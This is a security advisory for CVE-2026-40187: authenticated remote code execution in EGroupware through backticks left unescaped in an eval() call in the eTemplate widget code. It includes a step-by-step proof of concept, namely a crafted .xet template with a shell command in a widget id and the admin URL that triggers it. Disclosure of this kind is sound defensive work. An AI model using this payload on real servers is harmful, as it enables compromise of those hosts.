# [H] EGroupware has Authenticated RCE via Malicious eTemplate Upload

## Summary
Severity: High
Advisory: GHSA-8737-2x9g-xjj7
CVE: CVE-2026-40187
CWE: CWE-78, CWE-95
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-07
Source: https://github.com/advisories/GHSA-8737-2x9g-xjj7
Type: github-advisory

## Affected
- Packagist: `egroupware/egroupware` — affected >=26.0.20251208 <26.4.20260413
- Packagist: `egroupware/egroupware` — affected >=0 <23.1.20260601

## Details
## Summary

An authenticated administrator can achieve OS-level Remote Code Execution (RCE) by uploading a malicious eTemplate XML file (`.xet`) to the VFS `/etemplates` mount.

The `Widget::expand_name()` method passes template widget attribute values directly into a PHP `eval()` call with only double-quote escaping applied - **backtick characters are not escaped**.

In PHP, backticks inside a double-quoted `eval()` string execute shell commands. This allows an admin-level user to escalate from web
application access to arbitrary OS command execution on the server.

------------------------------------------------------------------------

## Details

The vulnerability is located in `api/src/Etemplate/Widget.php`, `Widget::expand_name()`:  (lines 703–728)

The method is designed to expand PHP variables (e.g., `$row`, `$col`,`$cont[id]`) in widget attribute values for auto-repeat grids. The `eval()` is triggered whenever `$name` contains a `$` character (line 706). The only sanitization applied before the eval is:

``` php
str_replace('"', '\\"', $name)
```

This escapes double quotes only. **Backtick characters are not escaped**. In PHP, backticks inside a double-quoted string in `eval()` are treated as shell execution operators — equivalent to  `shell_exec()`. A widget `id` of `$row\`id`` produces:

```
eval('$name = "$row`id`";');  // executes shell command: id
```

`expand_name()` is called from:

-   `form_name()`
-   `expand_widget()`
-   `set_attrs()`
-   `Template::run()`

The `/etemplates` VFS path is created exclusively for admin users — it is `chgrp`'d to `Admins` and `chmod`'d to `075` (Admins group has full rwx): class.filemanager_admin.inc.php:95-106

Custom templates in `/etemplates` take precedence over built-in filesystem templates, meaning a malicious template can silently override any existing application template.


**Mitigating factor**: The official Docker deployment sets `disable_functions = exec,passthru,shell_exec,system,proc_open,popen` in `php.ini`, which also blocks PHP backtick execution (backticks internally call shell_exec). Non-Docker or non-hardened deployments without this `php.ini` setting are fully vulnerable. Dockerfile:47

The current master branch in api/setup/setup.inc.php, confirming the vulnerability is present in the latest code as of today. setup.inc.php:14-17


------------------------------------------------------------------------

## Proof of Concept (PoC)

### Prerequisites

-   Admin account
-   Non-Docker deployment, or Docker deployment where disable_functions has been removed/modified in php.ini


### Step 1 — Mount /etemplates:
Log in as admin, navigate to Admin → Filemanager → VFS Mounts, and click "Install custom templates". This executes the code in `filemanager_admin.inc.php` that mounts `/etemplates` with Admins-group write access.

### Step 2 — Upload malicious template:

Create a file named `index.xet` with the following content:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<overlay>
  <template id="admin.index">
    <grid>
      <columns><column/></columns>
      <rows>
        <row>
          <textbox id="$row`touch /tmp/pwned_egw 2>/dev/null`"/>
        </row>
      </rows>
    </grid>
  </template>
</overlay>
```
Upload this file to `/etemplates/admin/templates/default/index.xet` via the VFS filemanager.


### Step 3 — Trigger execution:
Navigate to the EGroupware admin panel:
```
https://<target>/egroupware/index.php?menuaction=admin.admin_ui.index  
```
When the template is loaded and beforeSendToClient() runs, form_name() calls expand_name() with $name = '$row\touch /tmp/pwned_egw 2>/dev/null`'and$row = 0`. The eval becomes:
```
eval('$name = "$row`touch /tmp/pwned_egw 2>/dev/null`";');

```

PHP executes the backtick expression as a shell command.

### Step 4 — Verify:
Check that `/tmp/pwned_egw` was created on the server. For a more impactful demonstration, replace `touch /tmp/pwned_egw` with `id > /tmp/pwned_egw` to capture the web server's OS user identity.



------------------------------------------------------------------------

## Impact

Authenticated Remote Code Execution (RCE) via eval() with unsanitized shell metacharacters.

Who is impacted: Any EGroupware installation where:

1. An admin account is compromised or a malicious admin exists, AND
2. The server is not running with disable_functions blocking shell_exec (i.e., non-Docker or misconfigured deployments)

------------------------------------------------------------------------

## Severity

The vulnerability allows escalation from EGroupware admin-level web access to arbitrary OS command execution as the web server user (typically www-data). From there, an attacker can read configuration files (including database credentials), pivot to other services, or establish persistence. This is not exploitable by regular (non-admin) users. The official Docker deployment is not affected due to disable_functions, but bare-metal, VM, or custom container deployments without this hardening are fully vulnerable.

## References
- https://github.com/EGroupware/egroupware/security/advisories/GHSA-8737-2x9g-xjj7
- https://github.com/EGroupware/egroupware
